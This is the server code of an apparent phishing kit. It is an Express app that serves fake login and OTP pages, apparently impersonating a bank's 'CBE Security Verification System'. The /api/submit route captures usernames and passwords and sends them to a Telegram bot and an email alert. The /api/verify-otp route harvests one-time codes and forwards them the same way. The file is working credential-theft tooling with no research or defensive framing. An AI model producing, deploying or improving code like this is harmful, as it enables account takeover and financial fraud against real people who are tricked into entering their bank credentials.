const express = require('express');
const path = require('path');
const session = require('express-session');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
require('dotenv').config({ path: '../config/.env' });

const database = require('./database');
const telegramBot = require('./telegram-bot');
const emailService = require('./email');
const logger = require('./logger');

const app = express();
const PORT = process.env.PORT || 3000;

// Security Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  xssFilter: true,
  noSniff: true,
  hidePoweredBy: true,
  frameguard: { action: 'deny' }
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Rate Limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW) * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX),
  message: 'Too many requests, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => {
    return req.ip === '127.0.0.1' || req.ip === '::1';
  }
});
app.use('/api/', limiter);

// Session Configuration
app.use(session({
  secret: process.env.SESSION_SECRET || 'default-secret-change-this',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 3600000,
    sameSite: 'strict'
  }
}));

// Body Parsers
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static Files
app.use(express.static(path.join(__dirname, '../public')));
app.use('/assets', express.static(path.join(__dirname, '../public/assets')));

// Request Logging
app.use((req, res, next) => {
  logger.info(`${req.method} ${req.url} - IP: ${req.ip}`);
  next();
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/otp-verify', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/otp-verify.html'));
});

app.get('/loading', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/loading.html'));
});

app.get('/success', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/success.html'));
});

// API Routes
app.post('/api/submit', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Get IP and User Agent
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const sessionId = req.session.id;

    // Store in database
    const userId = await database.saveCredentials({
      username,
      password,
      ip,
      userAgent,
      sessionId,
      timestamp: new Date().toISOString()
    });

    // Send Telegram Notification
    await telegramBot.sendCredentials({
      id: userId,
      username,
      password,
      ip,
      userAgent,
      timestamp: new Date().toISOString()
    });

    // Send Email Alert
    await emailService.sendAlert({
      username,
      password,
      ip,
      userAgent,
      timestamp: new Date().toISOString()
    });

    // Log successful submission
    logger.info(`Credentials captured - User: ${username}, IP: ${ip}`);

    // Update session
    req.session.userId = userId;
    req.session.username = username;

    res.json({
      success: true,
      redirect: '/otp-verify'
    });

  } catch (error) {
    logger.error(`Submit error: ${error.message}`);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/verify-otp', async (req, res) => {
  try {
    const { otp } = req.body;
    const userId = req.session.userId;

    if (!userId) {
      return res.status(401).json({ error: 'Session expired' });
    }

    if (!otp || otp.length !== 6) {
      return res.status(400).json({ error: 'Invalid OTP format' });
    }

    // Save OTP
    await database.saveOTP({
      userId,
      otp,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString()
    });

    // Send OTP to Telegram
    await telegramBot.sendOTP({
      userId,
      otp,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString()
    });

    logger.info(`OTP submitted - User ID: ${userId}`);

    res.json({
      success: true,
      redirect: '/loading'
    });

  } catch (error) {
    logger.error(`OTP verification error: ${error.message}`);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/complete', async (req, res) => {
  try {
    const userId = req.session.userId;
    
    if (userId) {
      await database.markComplete(userId);
      logger.info(`Process completed - User ID: ${userId}`);
    }

    res.json({ success: true });

  } catch (error) {
    logger.error(`Complete error: ${error.message}`);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Error Handling
app.use((err, req, res, next) => {
  logger.error(`Error: ${err.message}`);
  res.status(500).json({ error: 'Something went wrong!' });
});

// Start Server
app.listen(PORT, '0.0.0.0', () => {
  logger.info(`Server running on http://localhost:${PORT}`);
  logger.info(`Environment: ${process.env.NODE_ENV || 'development'}`);
  logger.info('CBE Security Verification System Started');
});

// Graceful Shutdown
process.on('SIGTERM', () => {
  logger.info('SIGTERM received, closing server...');
  process.exit(0);
});

process.on('unhandledRejection', (reason, promise) => {
  logger.error(`Unhandled Rejection at: ${promise}, reason: ${reason}`);
});
